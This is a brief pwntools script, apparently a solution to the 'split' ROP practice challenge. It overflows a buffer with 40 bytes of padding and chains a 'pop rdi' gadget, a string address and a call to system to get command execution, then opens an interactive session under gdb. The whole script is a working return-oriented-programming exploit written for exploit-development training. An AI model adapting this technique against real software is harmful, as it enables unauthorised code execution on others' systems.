from pwn import *

elf = ELF("./split")

io = gdb.debug(elf.path)

call_system = 0x0040074b
pop_rdi = 0x004007c3 # pop rdi ; ret

io.sendline(b"A" * 40 + \
        p64(pop_rdi) + \
        p64(elf.symbols["usefulString"]) + \
        p64(call_system))

io.interactive()
